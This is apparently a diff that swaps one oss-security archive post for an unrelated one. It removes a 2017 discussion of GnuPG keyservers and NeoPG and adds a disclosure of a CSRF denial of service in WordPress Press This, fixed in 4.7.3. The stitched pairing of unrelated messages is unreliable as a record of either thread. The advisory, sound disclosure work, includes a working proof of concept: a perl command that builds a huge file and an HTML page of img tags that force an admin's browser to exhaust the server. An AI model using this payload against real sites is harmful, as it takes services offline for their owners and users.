@@ -1,131 +1,105 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/12/10/3
-Message-ID: <e990a29d-04a4-bf5b-d743-087867d56256@ruhr-uni-bochum.de>
-Date: Sun, 10 Dec 2017 14:16:24 +0100
-From: Marcus Brinkmann <marcus.brinkmann@...r-uni-bochum.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/06/7
+Message-ID: <2de68dc9-33ed-3cfc-a621-f958625a2a6b@securify.nl>
+Date: Tue, 7 Mar 2017 00:02:13 +0100
+From: Summer of Pwnage <lists@...urify.nl>
 To: oss-security@...ts.openwall.com
-Subject: Re: Re: Recommendations GnuPG-2 replacement
+Subject: Cross-Site Request Forgery in WordPress Press This function allows DoS
 Content-Type: text/plain; charset=utf-8
 
-Hi Phil,
+------------------------------------------------------------------------
+Cross-Site Request Forgery in WordPress Press This function allows DoS
+------------------------------------------------------------------------
+Sipke Mellema, July 2016
 
-thank you for your work on the keyservers, and thank you for the
-explanations of the reasons behind it, and your thoughts on the matter.
-They are very valuable to me, as I too am learning a lot about the
-history and implementation details on the way.
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+A Cross-Site Request Forgery (CSRF) vulnerability exists on the Press
+This page of WordPress. This issue can be used to create a Denial of
+Service (DoS) condition  if an authenticated administrator visits a
+malicious URL.
 
-I didn't want to complain that the openpgp keyservers have their own
-self-signed root CA - it was just one of those things that I didn't
-expect and only found out by digging through the code.  I do have some
-concerns about it, but I also recognize the history and the effort of
-the community to provide a decentralized solution to a very difficult
-problem.
+------------------------------------------------------------------------
+OVE ID
+------------------------------------------------------------------------
+OVE-20160718-0005
 
-As for your larger point that the WoT and the keyserver network is
-dysfunctional, I agree.  Key distribution is the major obstacle in
-OpenPGP adoption.  I am probably not smart enough to solve this problem,
-but I think I am smart enough to make the code base easy enough to work
-with so other people can have a go at it.
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on WordPress [2] version 4.5.3.
 
-One short term goal is to support keybase.io, which provides some
-publicly verifiable information.  But not everybody wants to have a
-social media profile.  I am tracking this here:
-https://github.com/das-labor/neopg/issues/20
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+This issue is resolved in WordPress version 4.7.3. [3]
 
-Another idea I am contemplating is running my own little keyserver that
-does only email verification.  It's like registering for a website, but
-without a website.  People are familiar with the concept, it gives at
-least the assurance that somebody (me) verified the email address, and
-it allows revocation.  It also gives some privacy (if we can keep bots
-away), though surely not against state actors.  I am aware that this is
-a dramatically less ambitious than what people have come to expect from
-the OpenPGP community, but smarter people than me have failed before, so
-I am willing to compromise.  The placeholder ticket is here:
-https://github.com/das-labor/neopg/issues/19
+------------------------------------------------------------------------
+Introduction
+------------------------------------------------------------------------
+WordPress is web software you can use to create a website, blog, or
+app. A Cross-Site Request Forgery (CSRF) vulnerability exists on the
+Press This page of WordPress. This issue can be used to create a Denial
+of Service (DoS) condition of an affected WordPress site.
 
-You may be happy to learn that I removed support for photo-id in
-NeoPG.[1]  I also removed 121 command line options so far (of close to
-400), and some other stuff.  For example, NeoPG will not reveal the
-timestamp and filename of an encrypted file to the recipient, and there
-is no option to set a comment in the armor output (NeoPG will also not
-reveal its own version number).  These are little things, but I believe
-they will add up.
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+WordPress' Press This [4] function allows quick publishing with a
+special web browser bookmarklet. An admin can also visit the Press This
+page directly. One of the features of Press This is scanning an external
+server for embeddable content. This is done with a GET request to:
+/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan
 
-Thanks!
-Marcus Brinkmann
+When this URL is called, Press This will download the page located at
+"URL" and look for content such as images and other embeddable elements.
+No maximum is set for the amount of data Press This can retrieve when
+scanning. This behavior can be abused by setting the external URL to a
+huge file and have an authenticated admin visit it. The PHP process will
+use 100% of its CPU resources to process the file. If an authenticated
+admin can be lured to an external page, then the malicious URL can be
+called many times, blocking all PHP server threads. This will cause the
+server to be unreachable for a while.
 
-[1]
-https://github.com/das-labor/neopg/commit/7c711ef6d8a8957f73dcf50dc2717334ab46ead7
+------------------------------------------------------------------------
+Proof of concept
+------------------------------------------------------------------------
+On an external server, create a large text file with the command:
+perl -e 'print "<>"x28000000' > foo.txt
 
-On 12/10/2017 05:15 AM, Phil Pennock wrote:
-> On 2017-12-08 at 00:51 +0100, Marcus Brinkmann wrote:
->> because I am not registering the root certificate of the keyserver CA -
->> yes, openpgp keyservers have their own self-signed root CA).
-> 
-> Look at the security and threat models and if you have a suggestion for
-> something better, please make it.
-> 
-> (So that you know I'm not a random crank: I wrote the operational guide
-> for the SKS keyservers and have done a lot of work on the community side
-> towards improving interop and helping move things forward.  I'm at least
-> a semi-informed crank.)
-> 
-> The keyservers are run by various people with no formal affiliation, as
-> a public good by each person choosing to cooperate.  There is no shared
-> organization, no formal responsibility.  There are "pool" hostnames,
-> which are maintained by spidering the peering mesh on the "list of
-> peers" info page, and working under a common hostname.
-> <https://sks-keyservers.net/overview-of-pools.php> has more information.
-> 
-> So for hkps, we need "several" different people to all have certificates
-> for the _same_ hostname.
-> 
-> This is all directly opposite to the security model of the TTP PKIX.  If
-> we could get certificates from a browser-store CA, I'd tell you to stop
-> trusting that CA because their processes are clearly broken.
-> 
-> Thus Kristian runs a tiny CA and issues certs to those people who've
-> been part of the community and ask to set things up, having demonstrated
-> a working keyserver setup.
-> 
-> What does TLS buy you?  Protection against evesdropping.  But you don't
-> know who you're talking to in the first place, so that's not really that
-> much.  Protection against tampering, but the same applies.
-> 
-> It's worth repeating: if the Acronym Agencies of various countries aren't
-> sponsoring arms-length keyservers where they get all the traffic logs
-> for some percentage of keyserver traffic, then they're incompetent.  If
-> they provide a useful public service and folks choose to use it, then
-> they get the normal operator logs, because they're the operators.  All
-> legal.
-> 
-> You don't know who is running the keyservers.  You don't know what's
-> happening to the logs.  You don't know that the keyservers are
-> trustworthy.  They are, at most, a useful swamp for collecting the data
-> from so that clients can do WoT calculations without caring about
-> fishing in a contaminated swamp, as the WoT _if done right_ takes care
-> of filtering out the sludge.
-> 
-> If you care about privacy in who you talk with, get the keys from some
-> other path, or run a keyserver, and use hkps with a certificate under
-> your control.
-> 
-> For myself, I need to look into building modern OCaml because FreeBSD
-> are still shipping a version with known integer overflow vulnerabilities
-> and so my SKS install is shut down.  It's somewhere on my long todo
-> list.  My server has hkps for the public pool, and a Let's Encrypt cert
-> under its own hostname.  It meets my needs, when I'm running it.  But
-> the viability of the public keyservers is well past any reasonable
-> expectation of their lifespan.  We've had the EFF sponsoring spamming
-> tools; we've had keyservers in Europe shut down because of privacy
-> demands because an append-only mesh-fill datastore can't remove keys and
-> people send out their email address and name paired into a key and then
-> get upset because it's out there; we're one
-> illicit-material-in-photo-uid incident away from global shutdown.
-> 
-> Don't rely on the public keyservers and please don't complain if their
-> security model, such as it is, requires a custom CA to be able to
-> operate with what minimal veneer of security TLS might provide.
-> 
-> -Phil, speaking only for myself
-> 
+Next, create a file called dos.html on the external server with enough
+entries to fill the connection pool of the WordPress server, as follows:
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
+[..]
+(replace <wp server> with the WordPress server address and <external
+server> with the external server)
+
+Now have a logged in admin visit dos.html. The server will be down for a
+while.
+------------------------------------------------------------------------
+References
+------------------------------------------------------------------------
+[1] 
+https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
+[2] https://wordpress.org/
+[3] 
+https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+[5] https://codex.wordpress.org/Press_This
